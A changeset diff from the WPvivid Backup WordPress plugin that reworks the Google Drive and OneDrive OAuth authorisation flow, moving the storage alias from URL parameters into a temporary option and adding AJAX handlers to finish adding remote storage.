  | 347 |  | </div> |
  | 348 |  | </td> |
  | 349 |  | <td class="column-description desc"> |
  | 350 |  | <div class="wpvivid-storage-form-desc"> |
  | 351 |  | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  | 352 |  | </div> |
  | 353 |  | </td> |
  | 354 |  | </tr> |
  | 355 |  | <tr> |
  | 356 |  | <td class="plugin-title column-primary"> |
  | 357 |  | <div class="wpvivid-storage-form"> |
  | 358 |  | <input type="text" class="regular-text" autocomplete="off" option="googledrive" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_GOOGLEDRIVE\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  | 359 |  | </div> |
  | 360 |  | </td> |
  | 361 |  | <td class="column-description desc"> |
  | 362 |  | <div class="wpvivid-storage-form-desc"> |
  | 363 |  | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  | 364 |  | </div> |
  | 365 |  | </td> |
  | 366 |  | </tr> |
  | 367 |  | <tr> |
  | 368 |  | <td class="plugin-title column-primary"> |
  | 369 |  | <div class="wpvivid-storage-form"> |
  | 370 |  | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  | 371 |  | </div> |
  | 372 |  | </td> |
  | 373 |  | <td class="column-description desc"> |
  | 374 |  | <div class="wpvivid-storage-form-desc"> |
  | 375 |  | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-google-drive-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  | 376 |  | </div> |
  | 377 |  | </td> |
  | 378 |  | </tr> |
  | 379 |  | <tr> |
  | 380 |  | <td class="plugin-title column-primary"> |
  | 381 |  | <div class="wpvivid-storage-select"> |
  | 382 |  | <label> |
  | 383 |  | <input type="checkbox" option="googledrive" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  | 384 |  | </label> |
  | 385 |  | </div> |
  | 386 |  | </td> |
  | 387 |  | <td class="column-description desc"> |
  | 388 |  | <div class="wpvivid-storage-form-desc"> |
  | 389 |  | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  | 390 |  | </div> |
  | 391 |  | </td> |
  | 392 |  | </tr> |
  | 393 |  | <tr> |
  | 394 |  | <td class="plugin-title column-primary"> |
  | 395 |  | <div class="wpvivid-storage-form"> |
  | 396 |  | <input onclick="wpvivid\_google\_drive\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Google Drive', 'wpvivid-backuprestore'); ?>" /> |
  | 397 |  | </div> |
  | 398 |  | </td> |
  | 399 |  | <td class="column-description desc"> |
  | 400 |  | <div class="wpvivid-storage-form-desc"> |
  | 401 |  | <i><?php \_e('Click the button to get Google authentication and add it to the storage list below.', 'wpvivid-backuprestore'); ?></i> |
  | 402 |  | </div> |
  | 403 |  | </td> |
  | 404 |  | </tr> |
  | 405 |  | </tbody> |
  | 406 |  | </table> |
  | 407 |  | </div> |
  | 408 |  | <script> |
  | 409 |  | function wpvivid\_check\_google\_drive\_storage\_alias(storage\_alias){ |
  | 410 |  | var find = 1; |
  | 411 |  | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  | 412 |  | jQuery(this).children('td').each(function (j) { |
  | 413 |  | if (j == 3) { |
  | 414 |  | if (jQuery(this).text() == storage\_alias) { |
  | 415 |  | find = -1; |
  | 416 |  | return false; |
  |  | 296 | <script> |
  |  | 297 | function wpvivid\_check\_google\_drive\_storage\_alias(storage\_alias){ |
  |  | 298 | var find = 1; |
  |  | 299 | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  |  | 300 | jQuery(this).children('td').each(function (j) { |
  |  | 301 | if (j == 3) { |
  |  | 302 | if (jQuery(this).text() == storage\_alias) { |
  |  | 303 | find = -1; |
  |  | 304 | return false; |
  |  | 305 | } |
  | 417 | 306 | } |
  |  | 307 | }); |
  |  | 308 | }); |
  |  | 309 | return find; |
  |  | 310 | } |
  |  | 311 | jQuery('#wpvivid\_google\_drive\_auth').click(function() |
  |  | 312 | { |
  |  | 313 | wpvivid\_google\_drive\_auth(); |
  |  | 314 | }); |
  |  | 315 |  |
  |  | 316 | function wpvivid\_google\_drive\_auth() |
  |  | 317 | { |
  |  | 318 | wpvivid\_settings\_changed = false; |
  |  | 319 | var name=''; |
  |  | 320 | var path=''; |
  |  | 321 | jQuery('input:text[option=googledrive]').each(function() |
  |  | 322 | { |
  |  | 323 | var key = jQuery(this).prop('name'); |
  |  | 324 | if(key==='name') |
  |  | 325 | { |
  |  | 326 | name = jQuery(this).val(); |
  | 418 | 327 | } |
  | 419 | 328 | }); |
  | 420 |  | }); |
  | 421 |  | return find; |
  | 422 |  | } |
  | 423 |  | function wpvivid\_google\_drive\_auth() |
  | 424 |  | { |
  | 425 |  | wpvivid\_settings\_changed = false; |
  | 426 |  | var name=''; |
  | 427 |  | var path=''; |
  | 428 |  | jQuery('input:text[option=googledrive]').each(function() |
  |  | 329 |  |
  |  | 330 | var remote\_default='0'; |
  |  | 331 |  |
  |  | 332 | jQuery('input:checkbox[option=googledrive]').each(function() |
  |  | 333 | { |
  |  | 334 | if(jQuery(this).prop('checked')) { |
  |  | 335 | remote\_default='1'; |
  |  | 336 | } |
  |  | 337 | else { |
  |  | 338 | remote\_default='0'; |
  |  | 339 | } |
  |  | 340 | }); |
  |  | 341 | if(name == ''){ |
  |  | 342 | alert(wpvividlion.remotealias); |
  |  | 343 | } |
  |  | 344 | else if(wpvivid\_check\_google\_drive\_storage\_alias(name) === -1) |
  |  | 345 | { |
  |  | 346 | alert(wpvividlion.remoteexist); |
  |  | 347 | } |
  |  | 348 | else |
  |  | 349 | { |
  |  | 350 | var ajax\_data; |
  |  | 351 | var remote\_from = wpvivid\_ajax\_data\_transfer('googledrive'); |
  |  | 352 | ajax\_data = { |
  |  | 353 | 'action': 'wpvivid\_google\_drive\_add\_remote', |
  |  | 354 | 'remote': remote\_from |
  |  | 355 | }; |
  |  | 356 | jQuery('#wpvivid\_google\_drive\_auth').css({'pointer-events': 'none', 'opacity': '0.4'}); |
  |  | 357 | jQuery('#wpvivid\_remote\_notice').html(''); |
  |  | 358 | wpvivid\_post\_request(ajax\_data, function (data) |
  |  | 359 | { |
  |  | 360 | try |
  |  | 361 | { |
  |  | 362 | var jsonarray = jQuery.parseJSON(data); |
  |  | 363 | if (jsonarray.result === 'success') |
  |  | 364 | { |
  |  | 365 | jQuery('#wpvivid\_google\_drive\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 366 | jQuery('input:text[option=googledrive]').each(function(){ |
  |  | 367 | jQuery(this).val(''); |
  |  | 368 | }); |
  |  | 369 | jQuery('input:password[option=googledrive]').each(function(){ |
  |  | 370 | jQuery(this).val(''); |
  |  | 371 | }); |
  |  | 372 | wpvivid\_handle\_remote\_storage\_data(data); |
  |  | 373 | location.href='admin.php?page=WPvivid&action=wpvivid\_google\_drive&main\_tab=storage&sub\_tab=googledrive&sub\_page=storage\_account\_google\_drive&result=success'; |
  |  | 374 | } |
  |  | 375 | else if (jsonarray.result === 'failed') |
  |  | 376 | { |
  |  | 377 | jQuery('#wpvivid\_remote\_notice').html(jsonarray.notice); |
  |  | 378 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 379 | } |
  |  | 380 | } |
  |  | 381 | catch (err) |
  |  | 382 | { |
  |  | 383 | alert(err); |
  |  | 384 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 385 | } |
  |  | 386 |  |
  |  | 387 | }, function (XMLHttpRequest, textStatus, errorThrown) |
  |  | 388 | { |
  |  | 389 | var error\_message = wpvivid\_output\_ajaxerror('adding the remote storage', textStatus, errorThrown); |
  |  | 390 | alert(error\_message); |
  |  | 391 | jQuery('#wpvivid\_google\_drive\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 392 | }); |
  |  | 393 | } |
  |  | 394 | } |
  |  | 395 | </script> |
  |  | 396 | <?php |
  |  | 397 | } |
  |  | 398 | else |
  |  | 399 | { |
  |  | 400 | ?> |
  |  | 401 | <div id="storage\_account\_google\_drive" class="storage-account-page"> |
  |  | 402 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 403 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Google Drive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 404 | </div> |
  |  | 405 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 406 | <strong><?php \_e('To add Google Drive, please get Google authentication first. Once authenticated, you will be redirected to this page, then you can add storage information and save it', 'wpvivid-backuprestore'); ?></strong> |
  |  | 407 | </div> |
  |  | 408 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 409 | <tbody> |
  |  | 410 | <tr> |
  |  | 411 | <td class="plugin-title column-primary"> |
  |  | 412 | <div class="wpvivid-storage-form"> |
  |  | 413 | <input onclick="wpvivid\_google\_drive\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Google Drive', 'wpvivid-backuprestore'); ?>" /> |
  |  | 414 | </div> |
  |  | 415 | </td> |
  |  | 416 | <td class="column-description desc"> |
  |  | 417 | <div class="wpvivid-storage-form-desc"> |
  |  | 418 | <i><?php \_e('Click to get Google authentication.', 'wpvivid-backuprestore'); ?></i> |
  |  | 419 | </div> |
  |  | 420 | </td> |
  |  | 421 | </tr> |
  |  | 422 | </tbody> |
  |  | 423 | </table> |
  |  | 424 | </div> |
  |  | 425 | <script> |
  |  | 426 | function wpvivid\_google\_drive\_auth() |
  | 429 | 427 | { |
  | 430 |  | var key = jQuery(this).prop('name'); |
  | 431 |  | if(key==='name') |
  | 432 |  | { |
  | 433 |  | name = jQuery(this).val(); |
  | 434 |  | } |
  | 435 |  | }); |
  | 436 |  |  |
  | 437 |  | var remote\_default='0'; |
  | 438 |  |  |
  | 439 |  | jQuery('input:checkbox[option=googledrive]').each(function() |
  | 440 |  | { |
  | 441 |  | if(jQuery(this).prop('checked')) { |
  | 442 |  | remote\_default='1'; |
  | 443 |  | } |
  | 444 |  | else { |
  | 445 |  | remote\_default='0'; |
  | 446 |  | } |
  | 447 |  | }); |
  | 448 |  | if(name == ''){ |
  | 449 |  | alert(wpvividlion.remotealias); |
  | 450 |  | } |
  | 451 |  | else if(wpvivid\_check\_google\_drive\_storage\_alias(name) === -1){ |
  | 452 |  | alert(wpvividlion.remoteexist); |
  | 453 |  | } |
  | 454 |  | else { |
  | 455 |  | location.href = '<?php echo admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_google\_drive\_auth&name='?>' + name + '&default=' + remote\_default; |
  | 456 |  | } |
  | 457 |  | } |
  | 458 |  | </script> |
  | 459 |  | <?php |
  |  | 428 | location.href = '<?php echo admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_google\_drive\_auth'?>'; |
  |  | 429 | } |
  |  | 430 | </script> |
  |  | 431 | <?php |
  |  | 432 | } |
  |  | 433 |  |
  | 460 | 434 | } |
  | 461 | 435 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L484) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L458) |  |
  | 484 | 458 | <td class="plugin-title column-primary"> |
  | 485 | 459 | <div class="wpvivid-storage-form"> |
  | 486 |  | <input ~~onclick="wpvivid\_google\_drive\_update\_auth();" class="button-primary" type="submit~~" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>" /> |
  |  | 460 | <input class="button-primary" type="submit" option="edit-remote" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>" /> |
  | 487 | 461 | </div> |
  | 488 | 462 | </td> |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L1065) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L1039) |  |
  | 1065 | 1039 | return array('result' => WPVIVID\_SUCCESS); |
  | 1066 | 1040 | } |
  |  | 1041 |  |
  |  | 1042 | public function finish\_add\_remote() |
  |  | 1043 | { |
  |  | 1044 | global $wpvivid\_plugin; |
  |  | 1045 | $wpvivid\_plugin->ajax\_check\_security(); |
  |  | 1046 | try { |
  |  | 1047 | if (empty($\_POST) || !isset($\_POST['remote']) || !is\_string($\_POST['remote'])) { |
  |  | 1048 | die(); |
  |  | 1049 | } |
  |  | 1050 |  |
  |  | 1051 | $tmp\_remote\_options =get\_option('wpvivid\_tmp\_remote\_options',array()); |
  |  | 1052 | delete\_option('wpvivid\_tmp\_remote\_options'); |
  |  | 1053 | if(empty($tmp\_remote\_options)||$tmp\_remote\_options['type']!==WPVIVID\_REMOTE\_GOOGLEDRIVE) |
  |  | 1054 | { |
  |  | 1055 | die(); |
  |  | 1056 | } |
  |  | 1057 |  |
  |  | 1058 | $json = $\_POST['remote']; |
  |  | 1059 | $json = stripslashes($json); |
  |  | 1060 | $remote\_options = json\_decode($json, true); |
  |  | 1061 | if (is\_null($remote\_options)) { |
  |  | 1062 | die(); |
  |  | 1063 | } |
  |  | 1064 |  |
  |  | 1065 | $remote\_options['path'] = WPVIVID\_GOOGLEDRIVE\_DEFAULT\_FOLDER; |
  |  | 1066 | $remote\_options=array\_merge($remote\_options,$tmp\_remote\_options); |
  |  | 1067 |  |
  |  | 1068 | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  |  | 1069 |  |
  |  | 1070 | if ($ret['result'] == 'success') { |
  |  | 1071 | $html = ''; |
  |  | 1072 | $html = apply\_filters('wpvivid\_add\_remote\_storage\_list', $html); |
  |  | 1073 | $ret['html'] = $html; |
  |  | 1074 | $pic = ''; |
  |  | 1075 | $pic = apply\_filters('wpvivid\_schedule\_add\_remote\_pic', $pic); |
  |  | 1076 | $ret['pic'] = $pic; |
  |  | 1077 | $dir = ''; |
  |  | 1078 | $dir = apply\_filters('wpvivid\_get\_remote\_directory', $dir); |
  |  | 1079 | $ret['dir'] = $dir; |
  |  | 1080 | $schedule\_local\_remote = ''; |
  |  | 1081 | $schedule\_local\_remote = apply\_filters('wpvivid\_schedule\_local\_remote', $schedule\_local\_remote); |
  |  | 1082 | $ret['local\_remote'] = $schedule\_local\_remote; |
  |  | 1083 | $remote\_storage = ''; |
  |  | 1084 | $remote\_storage = apply\_filters('wpvivid\_remote\_storage', $remote\_storage); |
  |  | 1085 | $ret['remote\_storage'] = $remote\_storage; |
  |  | 1086 | $remote\_select\_part = ''; |
  |  | 1087 | $remote\_select\_part = apply\_filters('wpvivid\_remote\_storage\_select\_part', $remote\_select\_part); |
  |  | 1088 | $ret['remote\_select\_part'] = $remote\_select\_part; |
  |  | 1089 | $default = array(); |
  |  | 1090 | $remote\_array = apply\_filters('wpvivid\_archieve\_remote\_array', $default); |
  |  | 1091 | $ret['remote\_array'] = $remote\_array; |
  |  | 1092 | $success\_msg = \_\_('You have successfully added a remote storage.', 'wpvivid-backuprestore'); |
  |  | 1093 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', true, $success\_msg); |
  |  | 1094 | } |
  |  | 1095 | else{ |
  |  | 1096 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', false, $ret['error']); |
  |  | 1097 | } |
  |  | 1098 |  |
  |  | 1099 | } |
  |  | 1100 | catch (Exception $error) { |
  |  | 1101 | $message = 'An exception has occurred. class: '.get\_class($error).';msg: '.$error->getMessage().';code: '.$error->getCode().';line: '.$error->getLine().';in\_file: '.$error->getFile().';'; |
  |  | 1102 | error\_log($message); |
  |  | 1103 | echo json\_encode(array('result'=>'failed','error'=>$message)); |
  |  | 1104 | die(); |
  |  | 1105 | } |
  |  | 1106 | echo json\_encode($ret); |
  |  | 1107 | die(); |
  |  | 1108 | } |
  | 1067 | 1109 | } |
* ## [wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php")

  | [r2661194](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L36 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L36 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 36 | 36 | public $options; |
  | 37 | 37 | public $callback; |
  |  | 38 | public $add\_remote; |
  | 38 | 39 | public function \_\_construct($options=array()) |
  | 39 | 40 | { |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L43) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L44) |  |
  | 43 | 44 | { |
  | 44 | 45 | add\_action('init', array($this, 'handle\_auth\_actions')); |
  |  | 46 | //wpvivid\_one\_drive\_add\_remote |
  |  | 47 | add\_action('wp\_ajax\_wpvivid\_one\_drive\_add\_remote',array( $this,'finish\_add\_remote')); |
  |  | 48 |  |
  | 45 | 49 | add\_action('wpvivid\_add\_storage\_tab',array($this,'wpvivid\_add\_storage\_tab\_one\_drive'), 12); |
  | 46 | 50 | add\_action('wpvivid\_add\_storage\_page',array($this,'wpvivid\_add\_storage\_page\_one\_drive'), 12); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L58) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L62) |  |
  | 58 | 62 | $this->options=$options; |
  | 59 | 63 | } |
  |  | 64 | $this->add\_remote=false; |
  | 60 | 65 | } |
  | 61 | 66 |  |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L79) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L84) |  |
  | 79 | 84 | { |
  | 80 | 85 | try { |
  | 81 |  | ~~if (!isset($\_GET['name']) || empty($\_GET['name'])) {~~ |
  | 82 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 83 |  | ~~return;~~ |
  | 84 |  | ~~}~~ |
  | 85 |  |  |
  | 86 |  | ~~$alias\_name = sanitize\_text\_field($\_GET['name']);~~ |
  | 87 |  |  |
  | 88 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 89 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 90 |  | ~~if (isset($value['name']) && $value['name'] == $alias\_name) {~~ |
  | 91 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 92 |  | ~~return;~~ |
  | 93 |  | ~~}~~ |
  | 94 |  | ~~}~~ |
  | 95 |  |  |
  | 96 |  | ~~$default = sanitize\_text\_field($\_GET['default']);~~ |
  | 97 | 86 | $auth\_id = uniqid('wpvivid-auth-'); |
  | 98 |  |  |
  |  | 87 | $remote\_options['auth\_id']=$auth\_id; |
  |  | 88 | update\_option('wpvivid\_tmp\_remote\_options',$remote\_options); |
  | 99 | 89 | $url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize' |
  | 100 | 90 | . '?client\_id=' . urlencode('37668be9-b55f-458f-b6a3-97e6f8aa10c9') |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L102) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L92) |  |
  | 102 | 92 | . '&response\_type=code' |
  | 103 | 93 | . '&redirect\_uri=' . urlencode('https://auth.wpvivid.com/onedrive\_v2/') |
  | 104 |  | . '&state=' . urlencode(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_one\_drive\_finish\_auth&~~name='.$alias\_name.'&default='.$default.'~~&auth\_id='.$auth\_id) |
  |  | 94 | . '&state=' . urlencode(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_one\_drive\_finish\_auth&main\_tab=storage&sub\_tab=one\_drive&sub\_page=storage\_account\_one\_drive&auth\_id='.$auth\_id) |
  | 105 | 95 | . '&display=popup' |
  | 106 | 96 | . '&locale=en'; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L123) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L113) |  |
  | 123 | 113 |  |
  | 124 | 114 | $remoteslist = WPvivid\_Setting::get\_all\_remote\_options(); |
  | 125 |  | foreach ($remoteslist as $key => $value) { |
  | 126 |  | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) { |
  |  | 115 | foreach ($remoteslist as $key => $value) |
  |  | 116 | { |
  |  | 117 | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) |
  |  | 118 | { |
  | 127 | 119 | \_e('<div class="notice notice-success is-dismissible"><p>You have authenticated the Microsoft OneDrive account as your remote storage.</p></div>'); |
  | 128 | 120 | return; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L130) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L122) |  |
  | 130 | 122 | } |
  | 131 | 123 |  |
  | 132 |  | global $wpvivid\_plugin; |
  | 133 |  |  |
  | 134 |  | $remote\_options['type'] = WPVIVID\_REMOTE\_ONEDRIVE; |
  | 135 |  | $remote\_options['token']['access\_token']=sanitize\_text\_field($\_POST['access\_token']); |
  | 136 |  | $remote\_options['token']['refresh\_token']=sanitize\_text\_field($\_POST['refresh\_token']); |
  | 137 |  | $remote\_options['token']['expires']=time()+sanitize\_text\_field($\_POST['expires\_in']); |
  | 138 |  |  |
  | 139 |  | $remote\_options['name'] = sanitize\_text\_field($\_GET['name']); |
  | 140 |  | $remote\_options['default'] = sanitize\_text\_field($\_GET['default']); |
  | 141 |  | $remote\_options['path'] = WPVIVID\_ONEDRIVE\_DEFAULT\_FOLDER; |
  | 142 |  | $remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']); |
  | 143 |  | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  | 144 |  |  |
  | 145 |  | if ($ret['result'] == 'success') { |
  | 146 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive&result=success'); |
  |  | 124 | $tmp\_options=get\_option('wpvivid\_tmp\_remote\_options',false); |
  |  | 125 | if($tmp\_options===false) |
  |  | 126 | { |
  | 147 | 127 | return; |
  | 148 |  | } else { |
  | 149 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive&result=error&resp\_msg=' . $ret['error']); |
  | 150 |  | return; |
  |  | 128 | } |
  |  | 129 | else |
  |  | 130 | { |
  |  | 131 | if($tmp\_options['auth\_id']===$\_GET['auth\_id']) |
  |  | 132 | { |
  |  | 133 | if(empty($\_POST['refresh\_token'])) |
  |  | 134 | { |
  |  | 135 | if(empty($tmp\_options['token']['refresh\_token'])) |
  |  | 136 | { |
  |  | 137 | $err = 'No refresh token was received from OneDrive, which means that you entered client secret incorrectly, or that you did not re-authenticated yet after you corrected it. Please authenticate again.'; |
  |  | 138 | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive&result=error&resp\_msg='.$err); |
  |  | 139 |  |
  |  | 140 | return; |
  |  | 141 | } |
  |  | 142 | } |
  |  | 143 | else |
  |  | 144 | { |
  |  | 145 | $tmp\_options['type'] = WPVIVID\_REMOTE\_ONEDRIVE; |
  |  | 146 | $tmp\_options['token']['access\_token']=sanitize\_text\_field($\_POST['access\_token']); |
  |  | 147 | $tmp\_options['token']['refresh\_token']=sanitize\_text\_field($\_POST['refresh\_token']); |
  |  | 148 | $tmp\_options['token']['expires']=time()+$\_POST['expires\_in']; |
  |  | 149 | update\_option('wpvivid\_tmp\_remote\_options',$tmp\_options); |
  |  | 150 | } |
  |  | 151 | $this->add\_remote=true; |
  |  | 152 | } |
  |  | 153 | else |
  |  | 154 | { |
  |  | 155 | return; |
  |  | 156 | } |
  | 151 | 157 | } |
  | 152 | 158 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2661194#L170) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-one-drive.php?rev=2667839#L176) |  |
  | 170 | 176 | } |
  | 171 | 177 | } |
  | 172 |  | ~~else if($\_GET['action']=='wpvivid\_one\_drive\_update\_auth')~~ |
  | 173 |  | ~~{~~ |
  | 174 |  | ~~try {~~ |
  | 175 |  | ~~if (!isset($\_GET['name']) || empty($\_GET['name'])) {~~ |
  | 176 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 177 |  | ~~return;~~ |
  | 178 |  | ~~}~~ |
  | 179 |  |  |
  | 180 |  | ~~$alias\_name = sanitize\_text\_field($\_GET['name']);~~ |
  | 181 |  | ~~$id = sanitize\_text\_field($\_GET['id']);~~ |
  | 182 |  | ~~$auth\_id = uniqid('wpvivid-auth-');~~ |
  | 183 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 184 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 185 |  | ~~if (isset($value['name']) && $value['name'] == $alias\_name && $key != $id) {~~ |
  | 186 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 187 |  | ~~return;~~ |
  | 188 |  | ~~}~~ |
  | 189 |  | ~~}~~ |
  | 190 |  |  |
  | 191 |  | ~~$url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'~~ |
  | 192 |  | ~~. '?client\_id=' . urlencode('37668be9-b55f-458f-b6a3-97e6f8aa10c9')~~ |
  | 193 |  | ~~. '&scope=' . urlencode('offline\_access files.readwrite')~~ |
  | 194 |  | ~~. '&response\_type=code'~~ |
  | 195 |  | ~~. '&redirect\_uri=' . urlencode('https://auth.wpvivid.com/onedrive\_v2/')~~ |
  | 196 |  | ~~. '&state=' . urlencode(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_one\_drive\_update\_finish\_auth&name='.$alias\_name.'&id='.$id.'&auth\_id='.$auth\_id)~~ |
  | 197 |  | ~~. '&display=popup'~~ |
  | 198 |  | ~~. '&locale=en';~~ |
  | 199 |  | ~~header('Location: ' . esc\_url\_raw($url));~~ |
  | 200 |  | ~~}~~ |
  | 201 |  | ~~catch (Exception $e){~~ |
  | 202 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 203 |  | ~~}~~ |
  | 204 |  | ~~}~~ |
  | 205 |  | ~~else if($\_GET['action']=='wpvivid\_one\_drive\_update\_finish\_auth')~~ |
  | 206 |  | ~~{~~ |
  | 207 |  | ~~try {~~ |
  | 208 |  | ~~if (isset($\_GET['auth\_error'])) {~~ |
  | 209 |  | ~~$error = urldecode($\_GET['auth\_error']);~~ |
  | 210 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_one\_drive\_update&result=error&resp\_msg=' . $error);~~ |
  | 211 |  |  |
  | 212 |  | ~~return;~~ |
  | 213 |  | ~~}~~ |
  | 214 |  |  |
  | 215 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 216 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 217 |  | ~~if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) {~~ |
  | 218 |  | ~~\_e('<div class="notice notice-success is-dismissible"><p>You have successfully updated the storage alias.</p></div>');~~ |
  | 219 |  | ~~return;~~ |
  | 220 |  | ~~}~~ |
  | 221 |  | ~~}~~ |
  | 222 |  |  |
  | 223 |  | ~~global $wpvivid\_plugin;~~ |
  | 224 |  |  |
  | 225 |  | ~~$remote\_options['type'] = WPVIVID\_REMOTE\_ONEDRIVE;~~ |
  | 226 |  | ~~$remote\_options['token']['access\_token']=sanitize\_text\_field($\_POST['access\_token']);~~ |
  | 227 |  | ~~$remote\_options['token']['refresh\_token']=sanitize\_text\_field($\_POST['refresh\_token']);~~ |
  | 228 |  | ~~$remote\_options['token']['expires']=time()+sanitize\_text\_field($\_POST['expires\_in']);~~ |
  | 229 |  | ~~$remote\_options['name'] = sanitize\_text\_field($\_GET['name']);~~ |
  | 230 |  | ~~$remote\_options['path'] = WPVIVID\_ONEDRIVE\_DEFAULT\_FOLDER;~~ |
